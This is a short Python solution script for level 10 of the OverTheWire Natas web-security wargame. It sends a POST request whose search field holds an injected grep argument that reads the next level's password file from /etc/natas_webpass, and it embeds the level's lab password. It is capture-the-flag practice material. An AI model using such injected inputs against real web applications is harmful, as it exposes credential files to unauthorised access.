#!/usr/bin/env python3
import requests
import re
from html import unescape

with open('natas10.html', 'w+') as out:
    username = 'natas10'
    password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
    
    url='http://%s.natas.labs.overthewire.org' % username
    
    s = requests.Session()
    # r = s.get(url+'/index-source.html', auth= (username, password))
    r = s.post(url, data = {"needle":". /etc/natas_webpass/natas11 #","submit" : "submit"}, auth= (username, password))
    content = r.text

    # out.write(unescape(content))
    out.write(re.findall('<pre>\n(.*)\n</pre>', content)[0])